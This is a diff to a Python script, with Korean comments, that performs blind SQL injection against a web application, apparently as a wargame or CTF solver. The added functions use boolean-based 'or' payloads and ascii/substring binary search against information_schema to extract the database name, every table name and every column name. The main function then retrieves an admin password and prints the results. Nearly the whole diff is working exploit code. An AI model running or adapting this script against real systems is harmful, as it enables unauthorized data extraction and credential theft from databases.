@@ -58,14 +58,112 @@ def sequential_search(query, number):
             return length
     raise OverflowError
 
+# DB 명 구하는 함수
+def get_db_name():
+    # DB 이름 길이 가져오기
+    query = "1' or length(database( )) > {0}#"
+    name_length = sequential_search(query, 30)
+
+    # DB 이름 가져오기
+    print('Fetching DB Name...')
+    query = "1' or ascii(substring(database( ), {0}, 1)) {1} {2}#"
+    db_name = binary_search(query, name_length)
+    print("{0:=^40}".format(""))
+    print("DB Name is " + db_name)
+    print("")
+    return db_name
+
+
+# DB 내에 있는 테이블 목록 가져오는 함수
+def get_tables_name(db_name):
+    # DB 내 테이블 갯수 가져오기
+    query = "1' or (select count(table_name) from information_schema.tables where table_schema=" \
+            + check_filtering_str(db_name) + ") > {0}#"
+    table_count = sequential_search(query, 50)
+
+    # DB 내 각 테이블들의 이름 길이 가져오기
+    table_names_length_list = []
+    for i in range(0, table_count):
+        query = "1' or (select length(table_name) from information_schema.tables where table_schema=" \
+                + check_filtering_str(db_name) + " limit " + str(i) + ", 1) > {0}#"
+        table_names_length_list.append(sequential_search(query, 50))
+
+    # DB 내 테이블 목록 가져오기
+    tables_name = []
+    print('Fetching tables name...')
+    print("{0:=^40}".format(""))
+    for i in range(0, table_count):
+        print("table " + str(i + 1) + " start!")
+        query = "1' or (select ascii(substring(table_name,{0},1)) from information_schema.tables where table_schema=" \
+                + check_filtering_str(db_name) + " limit " + str(i) + ", 1) {1} {2}#"
+        tables_name.append(binary_search(query, table_names_length_list[i]))
+
+    print("{0:=^40}".format(""))
+    for i in range(0, table_count):
+        print("table : " + str(i + 1) + " : " + tables_name[i])
+    print("")
+    return tables_name
+
+
+# 테이블 내에 있는 컬럼 목록 가져오는 함수
+def get_columns_name(table_name):
+    # 테이블 내 컬럼 갯수 가져오기
+    query = "1' or (select count(*) from information_schema.columns where table_name=" \
+            + check_filtering_str(table_name) + ") > {0}#"
+    column_count = sequential_search(query, 100)
+
+    # 테이블 내 각 컬럼들의 이름 길이 가져오기
+    column_list_length = []
+    for i in range(0, column_count):
+        query = "1' or (select length(column_name) from information_schema.columns where table_name=" \
+                + check_filtering_str(table_name) + " limit " + str(i) + ", 1) > {0}#"
+        column_list_length.append(sequential_search(query, 50))
+
+    # 테이블 내 컬럼 목록 가져오기
+    columns_name = []
+    print('Fetching columns name...')
+    print("{0:=^40}".format(""))
+    for i in range(0, column_count):
+        print("table " + table_name + "'s column " + str(i + 1) + " start!")
+        query = "1' or (select ascii(substring(column_name,{0},1)) from information_schema.columns where table_name=" \
+                + check_filtering_str(table_name) + " limit " + str(i) + ", 1) {1} {2}#"
+        columns_name.append(binary_search(query, column_list_length[i]))
+
+    print("{0:=^40}".format(""))
+    for i in range(0, column_count):
+        print("table : " + table_name + " / Column " + str(i + 1) + " : " + columns_name[i])
+    print("")
+    return columns_name
+
+
 
 # 메인 함수
 def main():
+    db_name = ''
+    tables_name = []
+    column_dict = {}
+    admin_pw = ''
+
     try:
-        #get_response("hi")
-        get_response("' or 1='1'# ")
-    except Exception:
-        print("Payload 요청 실패")
+        db_name = get_db_name()
+
+        tables_name = get_tables_name(db_name)
+
+        for table_name in tables_name:
+            column_dict[table_name] = get_columns_name(table_name)
+
+        admin_pw = get_pw('pw')
+        print("\n\n")
+
+        print_result(db_name, column_dict, admin_pw)
+    except OverflowError:
+        print("Error : DB, Column, Table 이름의 길이가 예상보다 깁니다.")
+    except ArithmeticError:
+        print("Error : DB, Column, Table 이름을 가져오지 못했습니다.")
+    except requests.exceptions.RequestException:
+        print("Error : WEB 서버에 접근할수 없습니다.")
+    except Exception as ex:
+        print("Error : 알 수 없는 에러로 DB 이름을 가져오지 못했습니다.", ex)
 
 if __name__ == "__main__":
     main()
